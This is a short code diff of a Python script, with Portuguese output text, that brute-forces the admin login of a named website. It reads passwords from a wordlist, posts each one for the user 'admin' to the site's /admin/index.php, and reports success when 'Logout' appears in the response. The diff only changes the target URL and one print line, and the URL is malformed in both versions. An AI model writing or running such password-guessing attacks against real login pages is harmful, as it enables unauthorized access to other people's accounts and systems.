@@ -5,6 +5,6 @@ with open ("wordlist.txt", "r") as file:
 
     for word in wordlist:
         data = {"user" : "admin", "password" : word}
-        response = requests.post("https:advanced.baconcn.com/admin/index.php ", data=data)
+        response = requests.post("https//:advanced.baconcn.com/admin/index.php ", data=data)
         if "Logout" in response.text:
-            print(f"Senha {} correta encontrada!".format(word))
+            print("Senha {} correta encontrada!".format(word))
